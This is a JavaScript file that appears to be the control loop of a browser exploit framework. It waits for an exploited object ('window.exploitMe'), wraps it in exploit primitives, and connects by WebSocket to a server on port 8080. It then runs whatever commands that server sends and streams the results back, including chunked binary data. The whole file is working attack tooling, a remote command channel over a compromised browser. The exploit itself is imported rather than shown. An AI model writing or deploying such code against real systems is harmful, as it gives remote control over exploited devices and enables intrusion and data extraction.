import * as utils from "./utils.js";
import ExploitPrimitives from "./primitives.js";
import handlerGen from "./handlers.js";

(() => {
  let wsPath = "ws://" + window.location.hostname + ":8080/";

  utils.loaded();
  
  utils.log("exploitMe: " + window.exploitMe);
  
  if(window.exploitMe == null) {
    location.reload();
    return;
  }
  
  let prims = new ExploitPrimitives(window.exploitMe);
  
  utils.log("Attempting to connect to " + wsPath);
  let ws = new WebSocket(wsPath);
  let handlers = handlerGen(prims);
  
  window.socket = ws;
  
  ws.onmessage = (event) => {
    let data = JSON.parse(event.data);

    let jsonResponse = (response) => {
      ws.send(JSON.stringify({
        command: "return",
        jobTag: data.jobTag,
        jobCommand: data.command,
        binaryPayload: false,
        response
      }));
    };

    let binaryResponse = (response) => {
      let chunkSize = 10000;
      
      ws.send(JSON.stringify({
        command: "return",
        jobTag: data.jobTag,
        jobCommand: data.command,
        binaryPayload: true,
        binaryLength: response.byteLength
      }));

      for(let i = 0; i < response.byteLength; i+= chunkSize) {
        ws.send(response.slice(i, i + chunkSize)); // slice clamps indices
      }
    };

    try {
      handlers[data.command](data, jsonResponse, binaryResponse);
    } catch(e) {
      utils.log(e);
      utils.log(e.stack);
      ws.send(JSON.stringify({
        command: "return",
        jobTag: data.jobTag,
        jobCommand: data.command,
        error: e
      }));
    }
  };
  
  ws.onopen = () => {
    utils.log("Connected to server.");
  };
  
  ws.onerror = (e) => {
    utils.log("Could not open websocket: " + JSON.stringify(e));
  };
})();
